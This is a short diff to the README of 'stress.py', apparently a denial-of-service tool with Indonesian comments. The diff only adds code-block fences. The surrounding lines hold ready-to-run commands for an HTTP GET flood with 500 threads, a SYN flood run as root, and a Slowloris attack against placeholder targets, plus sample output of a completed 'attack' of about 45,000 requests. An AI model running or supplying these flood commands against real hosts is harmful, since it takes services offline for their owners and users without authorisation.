@@ -14,7 +14,7 @@ python stress.py
 
 
 ## EXAMPLE 
-
+```
 # HTTP GET flood dengan 500 thread async
 python3 stress.py -t example.com -p 443 --protocol http --async --ssl -T 500 -d 120
 
@@ -29,7 +29,7 @@ sudo python3 stress.py -t target.com -p 443 --protocol syn -T 500
 
 # Slowloris
 python3 stress.py -t target.com -p 80 --protocol slowloris -T 200 --keep-alive
-
+```
 
 
 
@@ -41,7 +41,7 @@ python3 stress.py -t example.com -p 80 --protocol http --method GET -T 100 -d 30
 
 
 ### EXAMPLE PROCESS ATTACK
-
+```
 [*] Starting HTTP Flood on http://example.com:80/
 [*] Method: GET | Threads: 100
 
@@ -59,5 +59,5 @@ Data Received:       89.45 MB
 Elapsed Time:        30.00 seconds
 ============================================================
 [+] Attack completed. Total requests: 45,783
-
+```
 
